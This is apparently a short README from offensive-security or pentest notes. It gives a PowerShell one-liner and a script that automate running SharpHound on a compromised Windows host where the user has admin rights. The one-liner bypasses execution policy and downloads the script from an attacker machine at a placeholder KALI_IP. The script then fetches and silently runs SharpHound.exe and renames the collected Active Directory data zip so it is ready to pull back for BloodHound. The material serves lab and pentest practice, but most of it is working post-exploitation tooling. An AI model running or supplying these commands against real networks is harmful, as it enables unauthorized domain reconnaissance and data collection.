# Sharphound
When on a windows machine and have admin, the idea of downloading and running sharphound is tiresome. Renaming the zip file so that its not too confusing is time wasiting. This script here automates that.

1. Have SharpHound.exe in your /var/www/html/ directory
2. On target, Run the one liner which will then: 
  a. Downloads the auto_sharphound.ps1 onto disk
  b. Download SharpHound.exe onto disk
  c. Executes .\SharpHound.exe
  d. Renames the .zip file to $hostname_$ipaddress.zip

3. Now all you have to do is download it to your kali machine and injest it into Bloodhound.

```
powershell -ep bypass -c "IWR http://<KALI_IP>/auto_sharphound.ps1 -OutFile auto_sharphound.ps1; .\auto_sharphound <KALI_IP>"
```

```powershell
param([string]$KaliIP)

if (-not $KaliIP) { exit }

$ExeName = "SharpHound.exe"
$KaliUrl = "http://$KaliIP/$ExeName"

Write-Host "[+] Downloading Sharphound"

# Download to current directory
Invoke-WebRequest -Uri $KaliUrl -OutFile $ExeName -UseBasicParsing -ErrorAction SilentlyContinue

if (Test-Path $ExeName) {
    $HostName = $env:COMPUTERNAME
    $IP = (Get-NetIPAddress -AddressFamily IPv4 | 
           Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and 
                          $_.IPAddress -notlike "169.*" -and 
                          $_.IPAddress -notlike "127.*" } | 
           Select-Object -First 1).IPAddress

    Write-Host "[+] Executing Sharphound on $HostName // $IP"

    # Run SharpHound (default collection + zip in current dir)
    & ".\$ExeName" 2>$null >$null

    # Find the newest .zip file
    $NewestZip = Get-ChildItem -Path . -Filter *.zip | 
                 Sort-Object LastWriteTime -Descending | 
                 Select-Object -First 1

    if ($NewestZip) {
        $NewName = "${HostName}_${IP}.zip"
        
        Rename-Item -Path $NewestZip.FullName -NewName $NewName -ErrorAction SilentlyContinue
        
        Write-Host "[+] Renaming $($NewestZip.Name)"
        Write-Host "[+] $NewName ready to download"
    }
}
```
